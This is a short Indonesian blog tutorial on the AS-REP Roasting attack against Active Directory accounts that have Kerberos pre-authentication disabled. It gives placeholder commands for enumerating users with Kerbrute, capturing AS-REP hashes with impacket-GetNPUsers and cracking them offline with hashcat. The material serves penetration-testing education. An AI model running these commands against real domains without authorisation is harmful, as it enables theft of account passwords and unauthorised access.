---
title: AS-REP Roasting Attack
author: "novran"
date: 2024-11-22 00:00:00 +0700
categories: [Active Directory Pentest]
tags: [Active Directory Pentest, Red Team]
mermaid: true
image:
  path: /images/2024-11-22-as-rep-roasting-attack-banner.png
  alt: AS-REP Roasting
---

AS-REP Roasting adalah teknik serangan yang menargetkan akun-akun di Active Directory yang **sengaja dikonfigurasi untuk tidak menggunakan pre-authentication Kerberos**.

![User does not use pre-authentication](/images/2024-11-22-as-rep-roasting-attack-preauth-disabled.png)

Flow singkatnya, penyerang akan **meminta tiket otentikasi (AS-REP) ke protokol Kerberos (Port 88) di Domain Controller** dan **jika penyerang berhasil mendapatkan hash-nya**, maka ia dapat melakukan **crack secara Offline** untuk mendapatkan _password (plain-text)_ yang digunakan oleh akun tersebut.

> Serangan ini biasanya bisa menjadi **Initial Access**, karena **dapat dieksekusi tanpa kredensial**. Namun, dengan catatan kita bisa PING atau terkoneksi ke Domain Controller-nya.

## Let's Do It

**Enum Valid Users using Kerbrute (Optional)**

Untuk mencari list user yang valid untuk kemudian di-capture hash-nya, bisa menggunakan Tool [Kerbrute](https://github.com/ropnop/kerbrute/releases/latest).

```bash
kerbrute userenum <LIST_USERS_FILE> --domain <DOMAIN> --dc <DC_IP> -o <VALID_USER_OUTPUT>
```

![Kerbrute User Enumeration](/images/2024-11-22-as-rep-roasting-attack-kerbrute.png)

### 1. Capture AS-REP

Untuk melakukan capture hash pengguna domain **yang preauthentication-nya dinonaktifkan**, di sini kita akan menggunakan _script_ `impacket-GetNPUsers`.

```bash
impacket-GetNPUsers <DOMAIN>/ -dc-ip <DC_IP> -usersfile <LIST_USERS_FILE> -format hashcat -outputfile <OUTPUT_HASHES>
```

![impacket-GetNPUsers AS REP Roasting](/images/2024-11-22-as-rep-roasting-attack-impacket.png)

### 2. Crack the AS-REP Hashes

Setelah berhasil memperoleh hash-nya, kita bisa melakukan _cracking hash_ tersebut menggunakan `hashcat`.

```bash
hashcat -m 18200 <OUTPUT_HASHES> <PASSWORDS_WORDLIST>
```

![Hashcat AS-REP Roasting](/images/2024-11-22-as-rep-roasting-attack-hashcat.png)
